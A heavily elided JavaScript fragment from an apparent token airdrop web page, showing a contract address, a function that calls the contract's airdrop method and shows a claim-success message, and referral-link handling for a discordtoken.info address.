...
const sttaddr = "0x231858b59864d6d15fbfe8e1e2940c62ba8b969f";
...
const getAirdrop = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '700,000,000 CORD sent to your wallet.',
...
if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
  ...
  document.getElementById('refaddress').value = 'https://discordtoken.info/?ref=' + document.getElementById('refaddress').value;
}
}
}
function calculate() {
